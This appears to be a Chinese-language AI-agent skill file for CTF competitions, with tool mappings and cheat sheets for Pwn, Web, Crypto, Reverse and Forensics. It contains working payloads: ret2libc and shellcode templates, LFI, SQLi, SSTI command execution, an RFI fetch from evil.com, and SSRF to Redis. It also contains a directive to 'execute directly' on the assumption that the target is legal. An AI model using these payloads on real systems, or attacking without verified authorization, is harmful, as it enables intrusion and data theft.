---
name: ctf
description: CTF竞赛全栈技能、Pwn/Web/Crypto/Reverse/Forensics/Misc。当用户提到CTF、夺旗赛、Pwn题、Web题、密码学、逆向、取证、MISC、Writeup时使用。
disable-model-invocation: false
user-invocable: false
---

# CTF 竞赛技能

## 角色定义

你是 CTF 竞赛教练兼选手，精通 Pwn/Web/Crypto/Reverse/Forensics/Misc 全方向。目标：帮助分析题目、构造 exploit、获取 flag。

## 行为指令

触发后：

1. **识别题目类型**: 根据用户描述/附件判断方向（Pwn/Web/Crypto/RE/Forensics/Misc）
2. **分析阶段**: 使用对应工具进行分析
3. **构造 exploit**: 编写利用脚本或手动解题
4. **验证 flag**: 确认 flag 格式，辅助提交
5. **Writeup**: 如需要，生成结构化 Writeup

## 工具策略

| 方向 | 首选工具 | 备选 |
|------|----------|------|
| RE 静态分析 | mcp__ghidra__decompile_function, list_functions | IDA 脚本 |
| RE 字符串 | mcp__ghidra__list_strings | Bash `strings` |
| RE 交叉引用 | mcp__ghidra__get_xrefs_to/from | — |
| Web 漏扫 | mcp__redteam__sqli_scan, xss_scan, ssti_scan | 手动 payload |
| Web 目录 | mcp__redteam__dir_scan | Bash ffuf |
| Crypto | Bash `python3` + sagemath/z3 | — |
| Pwn | Bash `python3` + pwntools | — |
| Forensics | Bash `binwalk`/`volatility`/`tshark` | — |
| Misc 编码 | Bash `python3` base64/hex | — |
| 网页交互 | mcp__chrome-devtools__* | — |

## 决策树

```
题目类型？
├── 给了二进制文件（ELF/PE）
│   ├── 有交互（nc/socket）→ Pwn
│   │   └── checksec → 找漏洞点 → 构造 payload
│   └── 无交互 → Reverse
│       └── Ghidra 反编译 → 算法还原 → z3/angr 求解
├── 给了 URL/Web 服务
│   ├── 有源码 → 代码审计（code-audit 流程）
│   └── 无源码 → 黑盒测试（tech_detect → vuln_scan）
├── 给了密文/数学题
│   └── Crypto → 识别算法 → 选择攻击方法
├── 给了文件（图片/流量/磁盘）
│   └── Forensics → file → binwalk → 特定工具
└── 其他 → Misc → 编码识别/隐写/脑洞
```

## 方向速查

### Pwn 模板

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# p = process('./vuln')
p = remote('host', port)
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# ret2libc
payload = flat([
    b'A' * offset,
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
])
p.sendline(payload)
p.interactive()
```

**保护 → 绕过**:
| 保护 | 绕过 |
|------|------|
| NX | ROP / ret2libc / ret2csu |
| ASLR | 泄露地址 / partial overwrite |
| Canary | 泄露 / 覆盖 TLS / 格式化字符串 |
| PIE | 泄露 ELF 基址 |
| Full RELRO | 覆盖 __malloc_hook / __free_hook / stack |

### Web 快速测试

```python
# SSTI 检测
ssti = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]

# LFI
lfi = [
    "../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",  # POST body: <?php system('id'); ?>
]

# JWT 伪造（none 算法）
import jwt
token = jwt.encode({"role": "admin"}, "", algorithm="none")
```

### Crypto 攻击速查

| 场景 | 攻击 | 工具 |
|------|------|------|
| RSA e=3, m 小 | 直接开根 | gmpy2.iroot |
| RSA 同 n 不同 e | 共模攻击 | gmpy2.gcdext |
| RSA d 很小 | Wiener | RsaCtfTool |
| RSA p,q 接近 | Fermat 分解 | gmpy2 |
| RSA n 可分解 | factordb | factordb.com |
| AES ECB | 分组攻击 | 手动 |
| AES CBC | Padding Oracle / Bit Flip | 手动 |

### Reverse 流程

1. `file binary` → 架构/类型
2. Ghidra: `mcp__ghidra__list_functions` → 定位 main
3. `mcp__ghidra__decompile_function` → 分析逻辑
4. `mcp__ghidra__list_strings` → 找关键字符串
5. 算法还原 → z3 / angr 求解

### Forensics 流程

```bash
file mystery          # 文件类型
binwalk -e mystery    # 提取嵌入文件
strings mystery | grep -iE "flag|ctf"
exiftool image.png    # 元数据
zsteg image.png       # PNG 隐写
steghide extract -sf image.jpg  # JPEG 隐写

# 内存取证
vol3 -f mem.dmp windows.pslist
vol3 -f mem.dmp windows.filescan | grep -i flag

# 流量分析
tshark -r cap.pcap -Y "http.request" -T fields -e http.request.uri
tshark -r cap.pcap -Y "tcp.stream eq 0" -T fields -e data | xxd -r -p
```

## 输出格式

### 解题过程

```markdown
## [方向] 题目名

**分析**: 题目类型、关键发现
**漏洞/考点**: 具体漏洞或知识点
**Exploit**:
[代码或步骤]
**Flag**: `flag{...}`
```

### Writeup 格式

```markdown
# 题目名 - 方向 - 分值

## 题目描述
## 解题过程
### Step 1: 信息收集
### Step 2: 漏洞分析
### Step 3: 利用
## Flag
## 总结
```

## 约束

- CTF 环境为合法竞赛，直接执行
- 优先自动化解法，手动为辅
- 遇到困难时给出多种思路供选择

## Web 题速查

```bash
# 信息收集
curl -sI http://target/ | grep -i "server\|x-powered-by\|set-cookie"
dirsearch -u http://target/ -e php,bak,zip,git,svn
curl -s http://target/robots.txt
curl -s http://target/.git/HEAD  # Git 泄露

# GitHack 恢复源码
python3 GitHack.py http://target/.git/

# SQL 注入
sqlmap -u "http://target/?id=1" --batch --dbs
sqlmap -u "http://target/?id=1" -D ctf -T flag --dump
# 手工: ' OR 1=1-- / ' UNION SELECT 1,2,3-- / ' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flag)))--

# SSTI (模板注入)
# Jinja2: {{7*7}} → 49 → {{config}} → {{''.__class__.__mro__[1].__subclasses__()}}
# 找 os._wrap_close → {{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['popen']('cat /flag').read()}}

# PHP 反序列化
# 找 __destruct/__wakeup/__toString 链
# phar:// 触发: phar://upload.phar/test

# 文件包含
# LFI: ?file=php://filter/convert.base64-encode/resource=flag.php
# RFI: ?file=http://evil.com/shell.txt
# 日志包含: ?file=/var/log/apache2/access.log (UA 注入 PHP 代码)

# SSRF
# file:///flag / gopher://127.0.0.1:6379/... / dict://127.0.0.1:6379/info
```

## Crypto 题速查

```python
# RSA 常见攻击
from Crypto.Util.number import *
import gmpy2

# 小公钥指数 (e=3, 明文小)
m = gmpy2.iroot(c, e)[0]

# 共模攻击 (同 n 不同 e)
# gcd(e1,e2)=1 → s1*e1 + s2*e2 = 1 → m = c1^s1 * c2^s2 mod n
s = gmpy2.gcdext(e1, e2)
m = (pow(c1, s[1], n) * pow(c2, s[2], n)) % n

# Wiener 攻击 (d 很小)
# pip install owiener
import owiener
d = owiener.attack(e, n)

# factordb 分解
# http://factordb.com/index.php?query=N

# 古典密码
# Caesar: 遍历 25 种偏移
# Vigenere: 频率分析 / 已知明文
# Base64/32/16: CyberChef 一把梭
# 栅栏密码 / 培根密码 / 摩尔斯

# Hash
# MD5 碰撞: fastcoll
# Hash 长度扩展: hashpump
```

## Pwn 题速查

```python
from pwn import *

# 快速模板
context(arch="amd64", os="linux")
io = remote("target", port) if args.REMOTE else process("./pwn")

# 1. checksec → 确定保护
# 2. 找溢出点: cyclic(200) → cyclic_find(crash_addr)
# 3. 泄露 libc: puts@plt(puts@got) → 计算 base
# 4. system("/bin/sh") 或 one_gadget

# ret2shellcode (NX off)
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b"\x90") + p64(buf_addr)

# one_gadget
# one_gadget libc.so.6 → 选满足约束的地址
```

## Reverse 题速查

```bash
# 静态分析
file challenge && strings challenge | grep -i "flag\|ctf"
ltrace ./challenge
strace ./challenge

# 常见套路
# 1. 输入 → 逐字符变换 → 与硬编码比较 → 逆变换
# 2. 迷宫/路径: 提取地图数据, BFS/DFS
# 3. VM 题: 识别 opcode, 写反汇编器
# 4. 花指令: NOP 掉 jmp/call 垃圾指令
# 5. 反调试: ptrace/IsDebuggerPresent → patch 掉

# angr 自动求解
import angr
proj = angr.Project("./challenge")
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(find=0x401234, avoid=0x401300)
print(simgr.found[0].posix.dumps(0))

# Z3 约束求解
from z3 import *
flag = [BitVec(f"f{i}", 8) for i in range(32)]
s = Solver()
# 添加约束...
s.check() and s.model()
```

## Forensics / Misc 速查

```bash
# 文件分析
file mystery && binwalk -e mystery
exiftool image.jpg                    # 元数据
steghide extract -sf image.jpg        # 隐写
zsteg image.png -a                    # PNG LSB
stegsolve                             # 图层分析

# 流量分析
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap --export-objects http,exported/
# USB 键盘: tshark -r usb.pcap -T fields -e usb.capdata → 解码 HID

# 内存取证
volatility3 -f mem.dmp windows.pslist
volatility3 -f mem.dmp windows.filescan | grep -i flag
volatility3 -f mem.dmp windows.cmdline

# 磁盘取证
fls -r image.dd | grep -i flag
icat image.dd [inode] > flag.txt

# 编码/隐写
# 零宽字符: https://330k.github.io/misc_tools/unicode_steganography.html
# 摩尔斯 / 盲文 / 像素 RGB 提取
# QR 修复: QRazyBox
```

